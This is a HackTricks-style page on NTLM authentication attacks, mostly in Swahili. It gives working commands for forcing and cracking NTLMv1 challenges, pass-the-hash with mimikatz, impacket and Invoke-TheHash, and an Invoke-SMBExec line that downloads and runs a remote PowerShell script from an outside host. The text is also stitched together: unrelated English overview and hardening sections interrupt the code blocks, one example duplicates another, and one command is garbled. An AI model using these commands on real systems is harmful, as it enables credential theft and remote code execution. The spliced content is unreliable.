# NTLM

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Taarifa Msingi

Katika mazingira ambapo **Windows XP na Server 2003** zinatumika, hash za LM (Lan Manager) hutumiwa, ingawa inatambulika kwa kiasi kikubwa kwamba hizi zinaweza kudukuliwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haijatumika, ikionyesha hash kwa herufi tupu.

Kwa chaguo-msingi, itifaki ya uwthibitishaji ya **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) huingilia kati chini ya hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa uwanja, kushindwa kwa Kerberos kutokana na usanidi usio sahihi, au wakati mawasiliano yanajaribiwa kutumia anwani ya IP badala ya jina la mwenyeji halali.

Kuwepo kwa kichwa cha **"NTLMSSP"** katika pakiti za mtandao hufanya ishara ya mchakato wa uwthibitishaji wa NTLM.

Msaada kwa itifaki za uwthibitishaji - LM, NTLMv1, na NTLMv2 - unawezeshwa na DLL maalum iliyoko katika `%windir%\Windows\System32\msv1\_0.dll`.

**Muhimu**:

* Hash za LM ni dhaifu na hash tupu ya LM (`AAD3B435B51404EEAAD3B435B51404EE`) inaonyesha kutofautiana kwake.
* Kerberos ndiyo njia ya msingi ya uwthibitishaji, na NTLM hutumiwa tu chini ya hali fulani.
* Pakiti za uwthibitishaji wa NTLM zinaweza kutambulika kwa kichwa cha "NTLMSSP".
* Itifaki za LM, NTLMv1, na NTLMv2 zinasaidiwa na faili ya mfumo `msv1\_0.dll`.

## LM, NTLMv1 na NTLMv2

Unaweza kuangalia na kurekebisha itifaki itakayotumiwa:

### GUI

Tekeleza _secpol.msc_ -> Sera za Lokali -> Chaguo za Usalama -> Usalama wa Mtandao: Kiwango cha uwthibitishaji wa LAN Manager. Kuna viwango 6 (kutoka 0 hadi 5).

![](<../../.gitbook/assets/image (919).png>)

### Usajili

Hii itaweka kiwango cha 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
**Inawezekana thamani:**
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Mpangilio wa msingi wa uthibitishaji wa Domain wa NTLM

1. **Mtumiaji** anaingiza **mikopo yake**
2. Mashine ya mteja **inatuma ombi la uthibitisho** likituma **jina la uwanja** na **jina la mtumiaji**
3. **Server** inatuma **changamoto**
4. **Mteja anachafua** **changamoto** kwa kutumia hash ya nenosiri kama ufunguo na kuituma kama jibu
5. **Server inatuma** kwa **Msimamizi wa Domain** jina la **uwanja, jina la mtumiaji, changamoto na jibu**. Ikiwa **Hakuna** Active Directory iliyowekwa au jina la uwanja ni jina la server, mikopo inaangaliwa **kitaaluma**.
6. **Msimamizi wa Domain anathibitisha kila kitu** na kutuma habari kwa server

**Server** na **Msimamizi wa Domain** wanaweza kuunda **Channel Salama** kupitia **Netlogon** server kwani Msimamizi wa Domain anajua nenosiri la server (ipo ndani ya db ya **NTDS.DIT**).

### Mpangilio wa uthibitishaji wa NTLM wa ndani

Uthibitishaji ni kama ule uliotajwa **hapo awali lakini** **server** anajua **hash ya mtumiaji** anayejaribu kuthibitisha ndani ya faili ya **SAM**. Kwa hivyo, badala ya kuuliza Msimamizi wa Domain, **server itajithibitisha yenyewe** ikiwa mtumiaji anaweza kuthibitisha.

### Changamoto ya NTLMv1

**Urefu wa changamoto ni baiti 8** na **jibu ni urefu wa baiti 24**.

**Hash NT (baiti 16)** imegawanywa katika **sehemu 3 za baiti 7 kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho imejazwa na sifuri**. Kisha, **changamoto** inachafuliwa kwa kila sehemu na **baiti zilizochafuliwa zinazopatikana** zinajumuishwa. Jumla: 8B + 8B + 8B = 24Baiti.

**Matatizo**:

* Ukosefu wa **kutofautisha**
* Sehemu 3 zinaweza **kushambuliwa kwa kujitegemea** ili kupata hash ya NT
* **DES inaweza kuvunjwa**
* Ufunguo wa 3 ni **kawaida na sifuri tano**.
* Kwa kutolewa **changamoto ile ile** jibu litakuwa **lile lile**. Kwa hivyo, unaweza kumpa **changamoto** muathiriwa namba "**1122334455667788**" na kushambulia jibu lililotumika **kwa kutumia meza za mvua zilizopangwa mapema**.

### Shambulio la NTLMv1

Siku hizi inakuwa nadra kupata mazingira yaliyowekwa na Unconstrained Delegation, lakini hii haimaanishi huwezi **kutumia huduma ya Print Spooler** iliyowekwa.

Unaweza kutumia baadhi ya mikopo/malipo uliyonayo tayari kwenye AD kuomba **printer kuthibitisha** dhidi ya **mwenyeji chini ya udhibiti wako**. Kisha, ukitumia `metasploit auxiliary/server/capture/smb` au `responder` unaweza **kuweka changamoto ya uthibitisho kuwa 1122334455667788**, kukamata jaribio la uthibitisho, na ikiwa ilifanywa kwa kutumia **NTLMv1** utaweza **kuvunja**.\
Ikiwa unatumia `responder` unaweza kujaribu \*\*kutumia bendera `--lm` \*\* kujaribu **kudhoofisha** **uthibitisho**.\
_Tafadhali kumbuka kwamba kwa mbinu hii uthibitisho lazima ufanyike kwa kutumia NTLMv1 (NTLMv2 sio halali)._

Kumbuka kwamba printer itatumia akaunti ya kompyuta wakati wa uthibitisho, na akaunti za kompyuta hutumia **manenosiri marefu na ya kutofautisha** ambayo labda **hutaweza kuvunja** kwa kutumia **kamusi za kawaida**. Lakini uthibitisho wa **NTLMv1** **unatumia DES** ([maelezo zaidi hapa](./#ntlmv1-challenge)), kwa hivyo kutumia huduma fulani zilizotengwa kwa kuvunja DES utaweza kuvunja (unaweza kutumia [https://crack.sh/](https://crack.sh) au [https://ntlmv1.com/](https://ntlmv1.com) kwa mfano).

### Shambulio la NTLMv1 kwa hashcat

NTLMv1 pia inaweza kuvunjwa na NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ambayo inaunda ujumbe wa NTLMv1 kwa njia ambayo inaweza kuvunjwa na hashcat.

Amri
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. NTLM is commonly used for authentication in Windows environments.

### NTLM Hash

An NTLM hash is a cryptographic hash used in the NTLM authentication protocol. It is generated by hashing the user's password. Attackers can capture NTLM hashes from systems and attempt to crack them offline to recover the original password.

### Pass-the-Hash Attack

A pass-the-hash attack is a technique where an attacker captures the NTLM hash of a user and uses it to authenticate to a remote system without knowing the user's plaintext password. This attack can be mitigated by implementing security measures such as using NTLMv2, enforcing complex passwords, and restricting NTLM usage.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Windows Hardening

## Introduction

NT LAN Manager (NTLM) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM has known vulnerabilities that can be exploited by attackers to compromise a Windows system. This guide provides recommendations to harden NTLM on Windows systems to mitigate these vulnerabilities.

## Recommendations

### Disable NTLM

To prevent attacks leveraging NTLM vulnerabilities, consider disabling NTLM where possible and instead use more secure authentication protocols such as Kerberos.

### Enforce NTLM Signing

Enforcing NTLM message signing can help prevent attackers from tampering with NTLM messages and performing relay attacks.

### Enable LDAP Server Signing Requirements

By enabling LDAP server signing requirements, you can ensure that LDAP traffic is signed, preventing man-in-the-middle attacks that target NTLM authentication.

### Implement Extended Protection for Authentication

Extended Protection for Authentication (EPA) enhances the protection of NTLM authentication by requiring additional validation of NTLM credentials.

### Monitor NTLM Usage

Regularly monitor NTLM usage on your Windows systems to detect any suspicious activity that may indicate an ongoing attack leveraging NTLM vulnerabilities.

## Conclusion

By following these recommendations and best practices for hardening NTLM on Windows systems, you can improve the overall security posture of your environment and reduce the risk of exploitation through NTLM vulnerabilities.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Chalaza hashcat (ugawanyaji bora kupitia chombo kama hashtopolis) kwani hii itachukua siku kadhaa vinginevyo.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Katika kesi hii tunajua nywila ya hii ni nywila kwa hivyo tutacheza kwa madhumuni ya demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Tunahitaji sasa kutumia zana za hashcat-utilities kubadilisha funguo zilizovunjika za des kuwa sehemu za hash ya NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Hatimaye sehemu ya mwisho:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
### Swahili Translation

## Kufunga NTLM

Kufunga NTLM kunaweza kusaidia kupunguza hatari ya mashambulizi ya kuingilia kati ya watu wa tatu. Kwa kufuata miongozo hii, unaweza kuimarisha usalama wa mfumo wako wa Windows:

1. **Kulemaza NTLM kwa kutumia GPO**: Wezesha kikwazo cha kuingia kwa NTLM kwa kutumia Group Policy Objects (GPO).
2. **Kuwezesha LDAP Signing**: Hakikisha kuwa LDAP Signing imeamilishwa kuzuia mashambulizi ya kati.
3. **Kuwezesha LDAP Sealing**: Wezesha LDAP Sealing kuzuia ufuatiliaji wa trafiki ya LDAP.
4. **Kuwezesha SMB Signing**: Hakikisha kuwa SMB Signing imeamilishwa kwa usalama zaidi wa uhusiano wa SMB.
5. **Kuwezesha Extended Protection for Authentication**: Wezesha Extended Protection for Authentication kuzuia mashambulizi ya mtu wa kati.

Kufuata hatua hizi kutaimarisha usalama wa mfumo wako wa Windows dhidi ya mashambulizi ya NTLM.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Changamoto ya NTLMv2

**Urefu wa changamoto ni herufi 8** na **majibu 2 hutumwa**: Moja ni **urefu wa herufi 24** na **urefu wa nyingine** ni **tofauti**.

**Jibu la kwanza** linatengenezwa kwa kuchifra kutumia **HMAC\_MD5** **mnyororo** ulioundwa na **mteja na uwanja** na kutumia kama **ufunguo** **hash MD4** ya **hash ya NT**. Kisha, **matokeo** yatatumiwa kama **ufunguo** kuchifra kutumia **HMAC\_MD5** **changamoto**. Kwa hili, **changamoto ya mteja ya herufi 8 itaongezwa**. Jumla: 24 B.

**Jibu la pili** linatengenezwa kwa kutumia **thamani kadhaa** (changamoto mpya ya mteja, **muda** ili kuepuka **mashambulizi ya kurudia...**)

Ikiwa una **pcap ambayo imekamata mchakato wa uthibitishaji uliofanikiwa**, unaweza kufuata mwongozo huu kupata uwanja, jina la mtumiaji, changamoto na jibu na kujaribu kuvunja nenosiri: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pita Hash

**Maranyingi unapokuwa na hash ya muathiriwa**, unaweza kutumia kuwa **kama yeye**.\
Unahitaji kutumia **zana** itakayofanya **uthibitishaji wa NTLM** kutumia **hash** hiyo, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** hash hiyo ndani ya **LSASS**, hivyo wakati wowote **uthibitishaji wa NTLM unafanywa**, hash hiyo itatumika. Chaguo la mwisho ndilo linalofanywa na mimikatz.

**Tafadhali, kumbuka unaweza kufanya mashambulizi ya Pita Hash pia kwa kutumia akaunti za Kompyuta.**

### **Mimikatz**

**Inahitaji kuendeshwa kama msimamizi**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Hii itazindua mchakato ambao utamilikiwa na watumiaji ambao wamezindua mimikatz lakini kwa ndani katika LSASS, sifa zilizohifadhiwa ni zile zilizo ndani ya paramita za mimikatz. Kisha, unaweza kupata ufikiaji wa rasilimali za mtandao kana kwamba wewe ni mtumiaji huyo (kama `runas /netonly` lakini hauitaji kujua nenosiri la maandishi wazi).

### Pass-the-Hash kutoka linux

Unaweza kupata utekelezaji wa nambari kwenye mashine za Windows kwa kutumia Pass-the-Hash kutoka Linux.\
[**Pata hapa kujifunza jinsi ya kufanya hivyo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Zana zilizokompiliwa za Impacket kwa Windows

Unaweza kupakua [binari za impacket kwa Windows hapa](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Katika kesi hii unahitaji kutaja amri, cmd.exe na powershell.exe sio halali kupata kabati la mwingiliano)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Kuna binari zingine za Impacket zaidi...

### Kuita-TheHash

Unaweza kupata skripti za powershell hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Kuita-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Kuita-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Kuita-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Kuita-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Kuita-Hash

Kazi hii ni **mchanganyiko wa zingine zote**. Unaweza kupitisha **wenyeji kadhaa**, **kutoa** wengine na **kuchagua** **chaguo** unalotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ikiwa unachagua **yoyote** ya **SMBExec** na **WMIExec** lakini haujatoa **parameta ya Amri** itaangalia tu ikiwa una **idhini za kutosha**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Mhariri wa Vitambulisho vya Windows (WCE)

**Inahitaji kukimbia kama msimamizi**

Chombo hiki kitafanya kitu sawa na mimikatz (kurekebisha kumbukumbu ya LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Utekelezaji wa mbali wa Windows kwa kutumia jina la mtumiaji na nenosiri

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Kuchota siri kutoka kwa Mwenyeji wa Windows

**Kwa maelezo zaidi kuhusu** [**jinsi ya kupata siri kutoka kwa mwenyeji wa Windows unapaswa kusoma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay na Responder

**Soma mwongozo kamili zaidi kuhusu jinsi ya kufanya mashambulizi hayo hapa:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Kupasua changamoto za NTLM kutoka kwa kuchukua mtandao

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
